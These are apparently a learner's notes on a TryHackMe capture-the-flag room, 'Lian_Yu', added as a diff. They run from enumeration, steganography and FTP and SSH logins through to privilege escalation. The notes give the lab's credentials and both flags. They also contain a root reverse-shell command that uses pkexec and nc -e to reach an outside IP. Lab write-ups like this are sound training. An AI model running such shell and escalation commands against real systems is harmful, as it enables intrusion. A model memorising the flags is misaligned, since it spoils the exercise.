@@ -1,0 +1,75 @@
+IP : 10.10.85.179
+
+Open Ports : 21,22,80,111
+
+Hidden directories found : /island, 
+	Code name found : vigilante
+Hidden directories inside /island : 2100
+
+Hidden .ticket in /islan/2100 : /green_arrow.ticket
+
+Found token : RTy8yhBQdscX
+
+Hint says it is base : lets check on cyber chef : !#th3h00d (Base 58)
+
+
+Logint o ftp : vigilante:!#th3h00d
+
+-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png 
+-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png 
+-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
+
+We also found that we were in /home/vigilante folder, moving back to /home we found another user : slade
+
+We cannot see Leave_me_alone.png, it is corropted, lets use hexedit to fix this : We got a password :  password
+
+Lets check jpeg with steghide : extracted ss.zip
+
+Lets unzip : 
+	passwd : message about visa to Lian_Yu
+	shado : M3tahuman
+
+Looks like a password:
+
+Lets try SSH:
+	vigilante : no luck
+	slade : We are in.
+
+We got user.txt : THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+
+Privesc : User slade may run the following commands on LianYu:                                                                 │
+    (root) PASSWD: /usr/bin/pkexec
+
+Lets check the manual : 
+
+PKEXEC(1)                                             pkexec                                             PKEXEC(1)
+
+NAME
+       pkexec - Execute a command as another user
+
+SYNOPSIS
+       pkexec [--version] [--disable-internal-agent] [--help]
+
+       pkexec [--user username] PROGRAM [ARGUMENTS...]
+
+DESCRIPTION
+       pkexec allows an authorized user to execute PROGRAM as another user. If username is not specified, then the
+       program will be executed as the administrative super user, root.
+
+RETURN VALUE
+       Upon successful completion, the return value is the return value of PROGRAM. If the calling process is not
+       authorized or an authorization could not be obtained through authentication or an error occured, pkexec
+       exits with a return value of 127. If the authorization could not be obtained because the user dismissed the
+       authentication dialog, pkexec exits with a return value of 126.
+
+
+We can use this for privesc, lets check that out.
+We can access root directory, lets use nc for reverse shell.
+
+	slade@LianYu:~$ sudo /usr/bin/pkexec nc -e /bin/sh 10.9.241.177 4444
+
+We got a shell as root
+
+We got the root flag : THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+
+!!!
